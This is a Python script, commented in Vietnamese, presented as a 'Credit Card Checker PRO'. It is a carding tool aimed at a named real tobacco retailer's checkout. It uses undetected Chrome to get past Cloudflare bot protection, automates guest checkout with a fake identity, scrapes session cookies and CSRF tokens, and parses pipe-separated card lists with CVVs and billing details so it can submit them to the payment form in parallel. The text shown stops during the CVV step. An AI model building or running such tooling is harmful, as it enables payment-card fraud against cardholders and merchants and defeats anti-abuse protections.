#!/usr/bin/env python3
"""
Credit Card Checker - PRO VERSION
Sử dụng SeleniumBase UC Mode để bypass Cloudflare tự động
Đây là phương pháp tốt nhất và ổn định nhất năm 2025
"""

import time
import json
import re
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Tuple
import urllib.parse

try:
    from seleniumbase import Driver
    from seleniumbase.common.exceptions import TextNotVisibleException
except ImportError:
    print("[!] Cần cài đặt: pip install seleniumbase")
    exit(1)

try:
    import requests
except ImportError:
    print("[!] Cần cài đặt: pip install requests")
    exit(1)


class CardCheckerPro:
    def __init__(self, threads: int = 5, headless: bool = False):
        """
        Khởi tạo Card Checker PRO với SeleniumBase UC Mode
        
        Args:
            threads: Số luồng check song song
            headless: Chạy browser ẩn (không khuyến khích với Cloudflare)
        """
        self.threads = threads
        self.headless = headless
        self.session = requests.Session()
        
        self.base_url = 'https://www.pipesandcigars.com'
        self.checkout_url = f'{self.base_url}/checkout'
        self.api_url = f'{self.base_url}/on/demandware.store/Sites-PC-Site/default/CheckoutServices-SubmitPayment'
        
        self.cookies = {}
        self.csrf_token = None
        
        print("\n" + "="*70)
        print("CARD CHECKER PRO - SeleniumBase UC Mode")
        print("="*70)
        print("[*] Khởi tạo browser và bypass Cloudflare...")
        
        self._init_session()
    
    def _init_session(self):
        """Khởi tạo session với SeleniumBase UC Mode"""
        try:
            # Launch browser trong UC mode (undetected-chromedriver)
            print("[*] Đang khởi động browser...")
            self.driver = Driver(
                uc=True,  # Undetected ChromeDriver mode
                headless=self.headless,
                incognito=False,
                agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
            )
            print("[✓] Browser đã sẵn sàng")
            
            # Truy cập trang chủ để bypass Cloudflare
            print(f"[*] Đang truy cập {self.base_url}...")
            self.driver.get(self.base_url)
            
            # Đợi trang load
            time.sleep(5)
            
            # Kiểm tra xem đã bypass Cloudflare chưa
            if "Just a moment" in self.driver.page_source:
                print("[*] Đang xử lý Cloudflare challenge...")
                time.sleep(10)  # Đợi Cloudflare tự giải
                self.driver.uc_gui_click_captcha()  # Click CAPTCHA nếu có
                time.sleep(5)
            
            print("[✓] Đã bypass Cloudflare thành công!")
            
            # Lấy cookies từ browser
            self._extract_cookies()
            
            # Thử truy cập checkout để lấy CSRF token
            self._extract_csrf_token()
            
        except Exception as e:
            print(f"[!] Lỗi khởi tạo: {e}")
            raise
    
    def _extract_cookies(self):
        """Lấy cookies từ browser"""
        try:
            selenium_cookies = self.driver.get_cookies()
            
            for cookie in selenium_cookies:
                self.cookies[cookie['name']] = cookie['value']
                self.session.cookies.set(
                    cookie['name'],
                    cookie['value'],
                    domain=cookie.get('domain', '.pipesandcigars.com')
                )
            
            print(f"[✓] Đã lấy {len(self.cookies)} cookies")
            
        except Exception as e:
            print(f"[!] Lỗi lấy cookies: {e}")
    
    def _extract_csrf_token(self):
        """Tự động lấy CSRF token từ trang checkout - thực hiện full flow"""
        try:
            print("[*] Đang thực hiện flow: Add product → Cart → Checkout...")
            
            # Step 1: Truy cập trang chủ
            print("[*] Step 1: Truy cập homepage...")
            self.driver.get(self.base_url)
            time.sleep(3)
            
            # Step 2: Click button ADD
            print("[*] Step 2: Tìm và click button ADD...")
            added = False
            
            try:
                # Scroll xuống để thấy products
                self.driver.execute_script("window.scrollTo(0, 800);")
                time.sleep(2)
                
                # Tìm tất cả button/link có text "ADD"
                print("[*] Tìm button có text 'ADD'...")
                
                # Thử XPath để tìm button có text ADD
                try:
                    add_buttons = self.driver.find_elements("xpath", "//button[contains(text(), 'ADD')]")
                    if not add_buttons:
                        add_buttons = self.driver.find_elements("xpath", "//a[contains(text(), 'ADD')]")
                    
                    if add_buttons:
                        print(f"[*] Tìm thấy {len(add_buttons)} button ADD")
                        # Click button đầu tiên
                        add_buttons[0].click()
                        added = True
                        time.sleep(3)
                        print("[✓] Đã click button ADD")
                except Exception as e:
                    print(f"[!] Lỗi tìm button ADD: {e}")
                
                # Nếu chưa add được, thử tìm bằng CSS
                if not added:
                    selectors = [
                        "button:contains('ADD')",
                        "a:contains('ADD')",
                        ".add-to-cart",
                        "button.add-to-cart",
                        "a.add-to-cart"
                    ]
                    
                    for selector in selectors:
                        try:
                            buttons = self.driver.find_elements("css selector", selector)
                            if buttons:
                                print(f"[*] Tìm thấy {len(buttons)} button với selector: {selector}")
                                buttons[0].click()
                                added = True
                                time.sleep(3)
                                print("[✓] Đã click ADD")
                                break
                        except:
                            continue
                
            except Exception as e:
                print(f"[!] Lỗi: {e}")
            
            if not added:
                print("[!] Không thể add product, thử truy cập cart trực tiếp...")
                raise Exception("Cannot add product")
            
            # Step 3: Click view cart
            print("[*] Step 3: Xem giỏ hàng...")
            try:
                view_cart_selector = "#addToCartPopUpHtml > div > div > div.modal-footer > div > div > a"
                view_cart_btn = self.driver.find_element("css selector", view_cart_selector)
                view_cart_btn.click()
            except:
                # Thử truy cập trực tiếp
                self.driver.get(f"{self.base_url}/cart")
            
            time.sleep(3)
            print("[✓] Đã vào trang giỏ hàng")
            
            # Step 4: Click checkout
            print("[*] Step 4: Checkout...")
            try:
                checkout_selector = "#main-cart-page-id > div.row.main-cart-page-row > div.col-lg-5.col-md-12.col-sm-12.cart-summary.floating-cart-summary > div.row.summary-details > div.row.row-button > div > form > button"
                checkout_btn = self.driver.find_element("css selector", checkout_selector)
                checkout_btn.click()
            except:
                # Thử selector đơn giản hơn
                checkout_btn = self.driver.find_element("css selector", "button.checkout-btn")
                checkout_btn.click()
            
            time.sleep(5)
            print("[✓] Đã vào trang checkout")
            
            # Step 5: Click CONTINUE (Proceed as Guest)
            print("[*] Step 5: Click CONTINUE (Proceed as Guest)...")
            
            # Lưu screenshot để debug
            try:
                self.driver.save_screenshot('checkout_login_page.png')
                print("[*] Đã lưu screenshot: checkout_login_page.png")
            except:
                pass
            
            try:
                # Đợi trang load
                time.sleep(3)
                
                # AGGRESSIVE MODE: Tìm và click MỌI button CONTINUE có thể
                found = False
                
                print("[*] BẮT ĐẦU TÌM VÀ CLICK BUTTON CONTINUE...")
                
                # Cách 1: Tìm TẤT CẢ elements có thể là button
                try:
                    # Tìm mọi thứ có thể click được
                    all_clickable = self.driver.find_elements("xpath", 
                        "//button | //a | //input[@type='submit'] | //input[@type='button'] | //*[@role='button']")
                    print(f"[*] Tìm thấy {len(all_clickable)} elements có thể click")
                    
                    for elem in all_clickable:
                        try:
                            # Lấy text của element
                            elem_text = ""
                            try:
                                elem_text = elem.text.strip().upper()
                            except:
                                pass
                            
                            # Lấy value attribute
                            try:
                                if not elem_text:
                                    elem_text = elem.get_attribute("value").upper()
                            except:
                                pass
                            
                            # Check nếu có chữ CONTINUE
                            if 'CONTINUE' in elem_text:
                                print(f"[*] Tìm thấy element có CONTINUE: '{elem_text}'")
                                print(f"    Tag: {elem.tag_name}, Visible: {elem.is_displayed()}")
                                
                                # Scroll đến element
                                try:
                                    self.driver.execute_script("arguments[0].scrollIntoView({block: 'center', behavior: 'smooth'});", elem)
                                    time.sleep(1.5)
                                except:
                                    pass
                                
                                # Thử click bằng nhiều cách
                                clicked = False
                                
                                # Cách 1: Click thường
                                try:
                                    elem.click()
                                    clicked = True
                                    print(f"[✓] Click thành công (normal click)")
                                except Exception as e1:
                                    print(f"[!] Normal click failed: {e1}")
                                    
                                    # Cách 2: Click bằng JavaScript
                                    try:
                                        self.driver.execute_script("arguments[0].click();", elem)
                                        clicked = True
                                        print(f"[✓] Click thành công (JS click)")
                                    except Exception as e2:
                                        print(f"[!] JS click failed: {e2}")
                                        
                                        # Cách 3: Force click bằng JS
                                        try:
                                            self.driver.execute_script("""
                                                arguments[0].dispatchEvent(new MouseEvent('click', {
                                                    view: window,
                                                    bubbles: true,
                                                    cancelable: true
                                                }));
                                            """, elem)
                                            clicked = True
                                            print(f"[✓] Click thành công (Force JS click)")
                                        except Exception as e3:
                                            print(f"[!] Force click failed: {e3}")
                                
                                if clicked:
                                    found = True
                                    print(f"[✓✓✓] ĐÃ CLICK BUTTON CONTINUE THÀNH CÔNG!")
                                    print(f"    → Element tag: {elem.tag_name}")
                                    print(f"    → Element text: '{elem_text}'")
                                    try:
                                        print(f"    → Element class: {elem.get_attribute('class')}")
                                        print(f"    → Element href: {elem.get_attribute('href')}")
                                    except:
                                        pass
                                    time.sleep(3)
                                    break
                        except Exception as e:
                            continue
                    
                    if not found:
                        print("[!] Không tìm thấy button CONTINUE nào có thể click")
                        
                except Exception as e:
                    print(f"[!] Lỗi tìm button: {e}")
                
                # Cách 2: Nếu vẫn chưa tìm thấy, thử tìm bằng partial text
                if not found:
                    print("[*] Thử tìm bằng XPath partial text...")
                    try:
                        xpaths = [
                            "//button[contains(translate(text(), 'CONTINUE', 'continue'), 'continue')]",
                            "//a[contains(translate(text(), 'CONTINUE', 'continue'), 'continue')]",
                            "//*[contains(translate(@value, 'CONTINUE', 'continue'), 'continue')]",
                            "//*[contains(translate(@aria-label, 'CONTINUE', 'continue'), 'continue')]"
                        ]
                        
                        for xpath in xpaths:
                            try:
                                elements = self.driver.find_elements("xpath", xpath)
                                if elements:
                                    print(f"[*] Tìm thấy {len(elements)} elements với xpath")
                                    for elem in elements:
                                        try:
                                            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", elem)
                                            time.sleep(1)
                                            self.driver.execute_script("arguments[0].click();", elem)
                                            found = True
                                            print(f"[✓] Đã click CONTINUE!")
                                            break
                                        except:
                                            continue
                                if found:
                                    break
                            except:
                                continue
                    except Exception as e:
                        print(f"[!] Lỗi XPath search: {e}")
                
                if found:
                    time.sleep(5)
                    print("[✓] Đã click CONTINUE")
                    
                    # Step 6: Fill shipping address form
                    print("[*] Step 6: Điền thông tin shipping address...")
                    time.sleep(2)
                    
                    try:
                        # Fill First Name
                        first_name_input = self.driver.find_element("css selector", "input[name*='firstName'], input[id*='firstName']")
                        first_name_input.clear()
                        first_name_input.send_keys("Michael")
                        
                        # Fill Last Name
                        last_name_input = self.driver.find_element("css selector", "input[name*='lastName'], input[id*='lastName']")
                        last_name_input.clear()
                        last_name_input.send_keys("Johnson")
                        
                        # Fill Address
                        address_input = self.driver.find_element("css selector", "input[name*='address1'], input[id*='address1']")
                        address_input.clear()
                        address_input.send_keys("350 5th Ave")
                        
                        # Fill City
                        city_input = self.driver.find_element("css selector", "input[name*='city'], input[id*='city']")
                        city_input.clear()
                        city_input.send_keys("New York")
                        
                        # Select State
                        try:
                            from selenium.webdriver.support.ui import Select
                            state_select = Select(self.driver.find_element("css selector", "select[name*='state'], select[id*='state']"))
                            state_select.select_by_value("NY")
                        except:
                            print("[!] Không thể chọn state")
                        
                        # Fill Zip Code
                        zip_input = self.driver.find_element("css selector", "input[name*='postal'], input[id*='postal'], input[name*='zip']")
                        zip_input.clear()
                        zip_input.send_keys("10118")
                        
                        # Fill Phone
                        phone_input = self.driver.find_element("css selector", "input[name*='phone'], input[id*='phone']")
                        phone_input.clear()
                        phone_input.send_keys("2175551234")
                        
                        # Fill Email
                        try:
                            email_input = self.driver.find_element("css selector", "input[name*='email'], input[id*='email']")
                            email_input.clear()
                            email_input.send_keys("m48pdf@wmhotmail.com")
                            print("[✓] Đã điền Email: m48pdf@wmhotmail.com")
                        except:
                            pass
                        
                        # Fill Confirm Email (QUAN TRỌNG - field bắt buộc)
                        # Dùng selector đã biết thành công: #shippingEmailConfirmdefault
                        print("[*] Đang điền Confirm Email...")
                        confirm_email_filled = False
                        
                        try:
                            # Thử selector đã biết trước
                            confirm_email_input = self.driver.find_element("css selector", "#shippingEmailConfirmdefault")
                            confirm_email_input.clear()
                            confirm_email_input.send_keys("m48pdf@wmhotmail.com")
                            confirm_email_filled = True
                            print("[✓] Đã điền Confirm Email (selector: #shippingEmailConfirmdefault)")
                        except:
                            # Fallback: Tìm qua label nếu selector không work
                            try:
                                print("[*] Selector mặc định không work, thử tìm qua label...")
                                labels = self.driver.find_elements("xpath", "//label[contains(translate(text(), 'CONFIRM', 'confirm'), 'confirm')]")
                                for label in labels:
                                    try:
                                        for_id = label.get_attribute("for")
                                        if for_id:
                                            input_elem = self.driver.find_element("css selector", f"#{for_id}")
                                            input_elem.clear()
                                            input_elem.send_keys("m48pdf@wmhotmail.com")
                                            confirm_email_filled = True
                                            print(f"[✓] Đã điền Confirm Email (ID: {for_id})")
                                            break
                                    except:
                                        continue
                            except Exception as e:
                                print(f"[!] Lỗi: {e}")
                        
                        if not confirm_email_filled:
                            print("[!] KHÔNG TÌM THẤY FIELD CONFIRM EMAIL!")
                        
                        # Fill Birthday (QUAN TRỌNG - field bắt buộc)
                        try:
                            birthday_selectors = [
                                "input[name*='birthday']",
                                "input[id*='birthday']",
                                "input[name*='birthDate']",
                                "input[placeholder*='Birthday']",
                                "input[placeholder*='MM/DD/YYYY']"
                            ]
                            for selector in birthday_selectors:
                                try:
                                    birthday_input = self.driver.find_element("css selector", selector)
                                    birthday_input.clear()
                                    birthday_input.send_keys("01/15/1990")
                                    print("[✓] Đã điền Birthday")
                                    break
                                except:
                                    continue
                        except Exception as e:
                            print(f"[!] Không tìm thấy Birthday field: {e}")
                        
                        time.sleep(1)
                        print("[✓] Đã điền thông tin shipping address")
                        
                        # Click CONTINUE button on shipping form
                        print("[*] Step 7: Click CONTINUE trên form shipping...")
                        shipping_continue_found = False
                        
                        # Dùng class đã biết: submit-shipping-info guest
                        try:
                            # Thử selector đã biết trước
                            continue_btn = self.driver.find_element("css selector", "button.submit-shipping-info.guest")
                            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", continue_btn)
                            time.sleep(1)
                            try:
                                continue_btn.click()
                            except:
                                self.driver.execute_script("arguments[0].click();", continue_btn)
                            shipping_continue_found = True
                            print("[✓] Đã click CONTINUE (selector: button.submit-shipping-info.guest)")
                        except:
                            # Fallback: Tìm tất cả button CONTINUE
                            try:
                                print("[*] Selector mặc định không work, tìm tất cả button...")
                                all_buttons = self.driver.find_elements("xpath", "//button | //a[contains(@class, 'btn')]")
                                for btn in all_buttons:
                                    try:
                                        if 'CONTINUE' in btn.text.upper():
                                            print(f"[*] Tìm thấy button: '{btn.text}'")
                                            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                                            time.sleep(1)
                                            try:
                                                btn.click()
                                            except:
                                                self.driver.execute_script("arguments[0].click();", btn)
                                            shipping_continue_found = True
                                            print("[✓] Đã click CONTINUE")
                                            break
                                    except:
                                        continue
                            except Exception as e:
                                print(f"[!] Lỗi: {e}")
                        
                        if shipping_continue_found:
                            print("[✓] Chuyển sang bước tiếp theo...")
                            
                            # Step 8: Xử lý popup Address Verification nếu có
                            print("[*] Step 8: Đợi và kiểm tra popup Address Verification...")
                            time.sleep(5)  # Đợi lâu hơn để popup xuất hiện
                            
                            popup_handled = False
                            # Thử tìm popup nhiều lần
                            for attempt in range(3):
                                try:
                                    print(f"[*] Attempt {attempt + 1}: Tìm button #useSuggestedAddress...")
                                    use_suggested_btn = self.driver.find_element("css selector", "#useSuggestedAddress")
                                    if use_suggested_btn.is_displayed():
                                        print("[*] ✓✓✓ TÌM THẤY POPUP ADDRESS VERIFICATION!")
                                        self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", use_suggested_btn)
                                        time.sleep(1)
                                        try:
                                            use_suggested_btn.click()
                                            print("[✓] Đã click USE SUGGESTED (normal click)")
                                        except:
                                            self.driver.execute_script("arguments[0].click();", use_suggested_btn)
                                            print("[✓] Đã click USE SUGGESTED (JS click)")
                                        popup_handled = True
                                        time.sleep(5)
                                        break
                                    else:
                                        print(f"[*] Button tồn tại nhưng không visible")
                                except Exception as e:
                                    print(f"[*] Attempt {attempt + 1}: Không tìm thấy - {e}")
                                    if attempt < 2:
                                        time.sleep(2)
                                    
                            if not popup_handled:
                                print("[*] Không tìm thấy popup bằng #useSuggestedAddress, thử fallback...")
                                try:
                                    # Fallback: Tìm bằng XPath
                                    selectors = [
                                        "//button[contains(text(), 'USE SUGGESTED')]",
                                        "//button[contains(text(), 'Use Suggested')]",
                                        "//input[@value='USE SUGGESTED']"
                                    ]
                                    
                                    for selector in selectors:
                                        try:
                                            use_suggested_btn = self.driver.find_element("xpath", selector)
                                            if use_suggested_btn.is_displayed():
                                                print("[*] Tìm thấy popup Address Verification (fallback)")
                                                self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", use_suggested_btn)
                                                time.sleep(1)
                                                try:
                                                    use_suggested_btn.click()
                                                except:
                                                    self.driver.execute_script("arguments[0].click();", use_suggested_btn)
                                                print("[✓] Đã click USE SUGGESTED")
                                                popup_handled = True
                                                time.sleep(3)
                                                break
                                        except:
                                            continue
                                    
                                    if not popup_handled:
                                        print("[*] Không có popup Address Verification")
                                except Exception as e:
                                    print(f"[*] Lỗi fallback: {e}")
                            
                            # Step 9: Click CONTINUE ở Delivery Method
                            print("[*] Step 9: Click CONTINUE ở Delivery Method...")
                            time.sleep(3)
                            
                            delivery_continue_found = False
                            try:
                                # Dùng selector chính xác: #submit-shipping-address
                                continue_btn = self.driver.find_element("css selector", "#submit-shipping-address")
                                if continue_btn.is_displayed():
                                    print("[*] Tìm thấy button CONTINUE (#submit-shipping-address)")
                                    self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", continue_btn)
                                    time.sleep(1)
                                    try:
                                        continue_btn.click()
                                        print("[✓] Đã click CONTINUE (normal click)")
                                    except:
                                        self.driver.execute_script("arguments[0].click();", continue_btn)
                                        print("[✓] Đã click CONTINUE (JS click)")
                                    delivery_continue_found = True
                                    time.sleep(5)
                            except Exception as e:
                                print(f"[!] Không tìm thấy #submit-shipping-address: {e}")
                                # Fallback
                                try:
                                    continue_buttons = self.driver.find_elements("xpath", "//button[contains(text(), 'CONTINUE')]")
                                    if continue_buttons:
                                        for btn in continue_buttons:
                                            try:
                                                if btn.is_displayed() and btn.is_enabled():
                                                    btn.click()
                                                    delivery_continue_found = True
                                                    print("[✓] Đã click CONTINUE (fallback)")
                                                    time.sleep(5)
                                                    break
                                            except:
                                                continue
                                except:
                                    pass
                            
                            # Step 10: Kiểm tra các bước còn lại
                            if delivery_continue_found:
                                print("[*] Step 10: Kiểm tra các bước còn lại...")
                                time.sleep(2)
                                
                                # Tìm và click tất cả button CONTINUE còn lại cho đến khi đến payment
                                max_attempts = 3
                                for attempt in range(max_attempts):
                                    try:
                                        # Tìm button CONTINUE
                                        buttons = self.driver.find_elements("xpath", "//button[contains(text(), 'CONTINUE')] | //a[contains(text(), 'CONTINUE')]")
                                        if buttons:
                                            print(f"[*] Tìm thấy {len(buttons)} button CONTINUE (attempt {attempt + 1})")
                                            for btn in buttons:
                                                try:
                                                    if btn.is_displayed() and btn.is_enabled():
                                                        print(f"[*] Click button: '{btn.text}'")
                                                        self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                                                        time.sleep(1)
                                                        try:
                                                            btn.click()
                                                        except:
                                                            self.driver.execute_script("arguments[0].click();", btn)
                                                        time.sleep(3)
                                                        print(f"[✓] Đã click CONTINUE (attempt {attempt + 1})")
                                                        break
                                                except:
                                                    continue
                                        else:
                                            print(f"[*] Không còn button CONTINUE, đã đến trang payment")
                                            break
                                        
                                        time.sleep(2)
                                    except Exception as e:
                                        print(f"[!] Lỗi ở attempt {attempt + 1}: {e}")
                                        break
                            
                            print("[✓] Đã hoàn thành tất cả các bước, sẵn sàng check thẻ")
                            
                            # Lưu screenshot trang cuối cùng
                            try:
                                self.driver.save_screenshot('final_page.png')
                                print("[*] Đã lưu screenshot trang cuối: final_page.png")
                            except:
                                pass
                        else:
                            print("[!] Không thể click CONTINUE trên form shipping")
                        
                    except Exception as e:
                        print(f"[!] Lỗi điền form: {e}")
                else:
                    print("[!] Không tìm thấy button CONTINUE ở bước đầu")
                    print("[*] Lưu screenshot để debug...")
                    try:
                        self.driver.save_screenshot('debug_no_continue.png')
                        print("[*] Đã lưu: debug_no_continue.png")
                    except:
                        pass
                    
            except Exception as e:
                print(f"[!] Lỗi click CONTINUE: {e}")
                
        except Exception as e:
            print(f"[!] Không thể thực hiện flow tự động: {e}")
            print("[*] Thử truy cập checkout trực tiếp...")
            self.driver.get(self.checkout_url)
            time.sleep(3)
            
            # Lấy page source
            page_source = self.driver.page_source
            
            # Debug: Lưu page source để xem
            with open('checkout_page.html', 'w', encoding='utf-8') as f:
                f.write(page_source)
            print("[*] Đã lưu page source vào checkout_page.html")
            
            # Tìm CSRF token trong page source
            # Pattern 1: input hidden với name="csrf_token"
            pattern1 = r'name=["\']csrf_token["\'][\s\S]*?value=["\']([^"\']+)["\']'
            match1 = re.search(pattern1, page_source)
            
            # Pattern 2: value trước name
            pattern2 = r'value=["\']([^"\']+)["\'][\s\S]*?name=["\']csrf_token["\']'
            match2 = re.search(pattern2, page_source)
            
            # Pattern 3: trong JavaScript
            pattern3 = r'csrf_token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
            match3 = re.search(pattern3, page_source)
            
            # Pattern 4: trong data attribute
            pattern4 = r'data-csrf=["\']([^"\']+)["\']'
            match4 = re.search(pattern4, page_source)
            
            if match1:
                self.csrf_token = match1.group(1)
            elif match2:
                self.csrf_token = match2.group(1)
            elif match3:
                self.csrf_token = match3.group(1)
            elif match4:
                self.csrf_token = match4.group(1)
            
            if self.csrf_token:
                print(f"[✓] Đã lấy CSRF token: {self.csrf_token[:50]}...")
            else:
                print("[!] Không tìm thấy CSRF token")
                print("[*] Tìm kiếm tất cả input hidden...")
                # Tìm tất cả input hidden
                hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', page_source)
                for inp in hidden_inputs[:5]:  # Chỉ show 5 cái đầu
                    print(f"    {inp[:100]}")
                self.csrf_token = ""
                
        except Exception as e:
            print(f"[!] Lỗi lấy CSRF token: {e}")
            self.csrf_token = ""
    
    def refresh_session(self):
        """Refresh cookies và CSRF token"""
        print("\n[*] Đang refresh session...")
        self._extract_cookies()
        self._extract_csrf_token()
    
    def parse_card(self, card_line: str) -> Dict[str, str]:
        """Parse thông tin thẻ"""
        card_line = card_line.strip()
        if not card_line or card_line.startswith('#'):
            return None
            
        parts = card_line.split('|')
        if len(parts) < 3:
            return None
            
        card_number = parts[0].strip().replace(' ', '')
        
        # Parse exp date
        if '/' in parts[1]:
            exp_parts = parts[1].split('/')
            exp_month = exp_parts[0].strip().zfill(2)
            exp_year = exp_parts[1].strip()
            cvv = parts[2].strip() if len(parts) > 2 else ''
        else:
            exp_month = parts[1].strip().zfill(2)
            exp_year = parts[2].strip() if len(parts) > 2 else ''
            cvv = parts[3].strip() if len(parts) > 3 else ''
        
        # Đảm bảo exp_year có 4 chữ số
        if len(exp_year) == 2:
            exp_year = '20' + exp_year
            
        # Xác định loại thẻ
        if card_number.startswith('4'):
            card_type = 'Visa'
        elif card_number.startswith('5'):
            card_type = 'Master Card'
        elif card_number.startswith('3'):
            card_type = 'American Express'
        else:
            card_type = 'Unknown'
        
        # Parse billing info nếu có
        billing = {}
        if len(parts) >= 11:
            billing = {
                'name': parts[4].strip(),
                'address': parts[5].strip(),
                'city': parts[6].strip(),
                'state': parts[7].strip(),
                'zip': parts[8].strip(),
                'country': parts[9].strip(),
                'phone': parts[10].strip()
            }
            
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv,
            'type': card_type,
            'billing': billing
        }
    
    def build_payload(self, card: Dict[str, str]) -> str:
        """Tạo payload cho request"""
        billing = card.get('billing', {})
        
        # Split name
        name = billing.get('name', 'Michael Johnson')
        name_parts = name.split()
        first_name = name_parts[0] if name_parts else 'Michael'
        last_name = name_parts[-1] if len(name_parts) > 1 else 'Johnson'
        
        data = {
            'dwfrm_billing_addressFields_typeID': 'useShippingAddress',
            'dwfrm_billing_addressFields_addressNickname': first_name,
            'dwfrm_billing_addressFields_firstName': first_name,
            'dwfrm_billing_addressFields_lastName': last_name,
            'dwfrm_billing_addressFields_companyName': '',
            'dwfrm_billing_addressFields_address1': billing.get('address', '350 5th Ave'),
            'dwfrm_billing_addressFields_address2': '',
            'dwfrm_billing_addressFields_city': billing.get('city', 'New York'),
            'dwfrm_billing_addressFields_country': billing.get('country', 'US'),
            'dwfrm_billing_addressFields_states_stateCode': billing.get('state', 'NY'),
            'dwfrm_billing_addressFields_isBilling': 'true',
            'dwfrm_billing_addressFields_postalCode': billing.get('zip', '10118'),
            'dwfrm_billing_contactInfoFields_phone': billing.get('phone', '2175551234'),
            'dwfrm_billing_addressFields_phoneNumberExtension': '',
            'dwfrm_billing_addressFields_residentialOrBusiness': 'Residential',
            'csrf_token': self.csrf_token,
            'localizedNewAddressTitle': 'new',
            'dwfrm_billing_paymentMethod': 'CREDIT_CARD',
            'dwfrm_billing_creditCardFields_cardType': card['type'],
            'dwfrm_billing_creditCardFields_cardNumber': card['number'],
            'dwfrm_billing_creditCardFields_expirationMonth': card['exp_month'],
            'dwfrm_billing_creditCardFields_expirationYear': card['exp_year'],
            'dwfrm_billing_creditCardFields_securityCode': card['cvv'],
        }
        
        return urllib.parse.urlencode(data)
    
    def check_card(self, card: Dict[str, str]) -> Tuple[str, str, str]:
        """Kiểm tra thẻ bằng cách điền form trực tiếp"""
        card_info = f"{card['number']}|{card['exp_month']}/{card['exp_year']}|{card['cvv']}"
        
        print(f"\n{'='*70}")
        print(f"[*] Checking card: {card_info}")
        print(f"{'='*70}")
        
        try:
            # Step 1: Tìm và điền các field thẻ
            # Đợi trang load
            time.sleep(2)
            
            # Lưu screenshot để debug
            try:
                self.driver.save_screenshot('payment_form.png')
                print("[*] Đã lưu screenshot: payment_form.png")
            except:
                pass
            
            # Tìm tất cả input fields
            print("[*] Tìm các input fields...")
            
            # Điền số thẻ (card number)
            try:
                # Thử nhiều selector
                card_number_selectors = [
                    "input[name*='cardNumber']",
                    "input[id*='cardNumber']",
                    "input[placeholder*='Card Number']",
                    "#cardNumber",
                    ".card-number-input"
                ]
                
                card_number_filled = False
                for selector in card_number_selectors:
                    try:
                        card_number_input = self.driver.find_element("css selector", selector)
                        if card_number_input.is_displayed():
                            card_number_input.clear()
                            card_number_input.send_keys(card['number'])
                            print(f"[✓] Đã điền số thẻ: {card['number']} (selector: {selector})")
                            card_number_filled = True
                            break
                    except:
                        continue
                
                if not card_number_filled:
                    print("[!] Không tìm thấy field số thẻ")
            except Exception as e:
                print(f"[!] Lỗi điền số thẻ: {e}")
            
            time.sleep(1)
            
            # Debug: Tìm tất cả select elements
            try:
                all_selects = self.driver.find_elements("css selector", "select")
                print(f"[DEBUG] Found {len(all_selects)} select elements on page:")
                for i, select in enumerate(all_selects):
                    try:
                        name = select.get_attribute('name') or 'N/A'
                        id_attr = select.get_attribute('id') or 'N/A'
                        aria_label = select.get_attribute('aria-label') or 'N/A'
                        print(f"  [{i}] name='{name}', id='{id_attr}', aria-label='{aria_label}'")
                    except:
                        pass
            except:
                pass
            
            # Điền Expiration Month
            try:
                exp_month_selectors = [
                    "select[name*='expirationMonth']",
                    "select[id*='expirationMonth']",
                    "select[name*='expiry']",
                    "select[id*='expiry']",
                    "#expirationMonth",
                    "select.expiry-month",
                    "select[aria-label*='month' i]",
                    "select[placeholder*='MM' i]"
                ]
                
                from selenium.webdriver.support.ui import Select
                month_filled = False
                
                for selector in exp_month_selectors:
                    try:
                        exp_month_select = self.driver.find_element("css selector", selector)
                        
                        # Format month với leading zero nếu cần
                        month_value = str(card['exp_month']).zfill(2)  # "3" -> "03"
                        
                        # Thử select by value
                        try:
                            Select(exp_month_select).select_by_value(month_value)
                            print(f"[✓] Đã chọn exp month: {month_value} (by value)")
                            month_filled = True
                            break
                        except:
                            # Thử select by visible text
                            try:
                                Select(exp_month_select).select_by_visible_text(month_value)
                                print(f"[✓] Đã chọn exp month: {month_value} (by text)")
                                month_filled = True
                                break
                            except:
                                # Thử select by index (month number)
                                try:
                                    Select(exp_month_select).select_by_index(int(card['exp_month']))
                                    print(f"[✓] Đã chọn exp month: {card['exp_month']} (by index)")
                                    month_filled = True
                                    break
                                except:
                                    continue
                    except:
                        continue
                
                if not month_filled:
                    print(f"[!] Không tìm thấy dropdown exp month")
                    
            except Exception as e:
                print(f"[!] Lỗi chọn exp month: {e}")
            
            # Điền Expiration Year
            try:
                exp_year_selectors = [
                    "select[name*='expirationYear']",
                    "select[id*='expirationYear']",
                    "select[name*='expiry']",
                    "select[id*='expiry']",
                    "#expirationYear",
                    "select.expiry-year",
                    "select[aria-label*='year' i]",
                    "select[placeholder*='YYYY' i]"
                ]
                
                year_filled = False
                
                for selector in exp_year_selectors:
                    try:
                        exp_year_select = self.driver.find_element("css selector", selector)
                        
                        # Thử select by value
                        try:
                            Select(exp_year_select).select_by_value(card['exp_year'])
                            print(f"[✓] Đã chọn exp year: {card['exp_year']} (by value)")
                            year_filled = True
                            break
                        except:
                            # Thử select by visible text
                            try:
                                Select(exp_year_select).select_by_visible_text(card['exp_year'])
                                print(f"[✓] Đã chọn exp year: {card['exp_year']} (by text)")
                                year_filled = True
                                break
                            except:
                                continue
                    except:
                        continue
                
                if not year_filled:
                    print(f"[!] Không tìm thấy dropdown exp year")
                    
            except Exception as e:
                print(f"[!] Lỗi chọn exp year: {e}")
            
            # Điền CVV
            try:
                cvv_selectors = [
                    "input[name*='securityCode']",
                    "input[id*='securityCode']",
                    "input[name*='cvv']",
                    "input[id*='cvv']",
                    "#saved-payment-security-code-1"
                ]
                
                for selector in cvv_selectors:
                    try:
                        cvv_input = self.driver.find_element("css selector", selector)
                        if cvv_input.is_displayed():
                            cvv_input.clear()
                            cvv_input.send_keys(card['cvv'])
                            print(f"[✓] Đã điền CVV: {card['cvv']}")
                            break
                    except:
                        continue
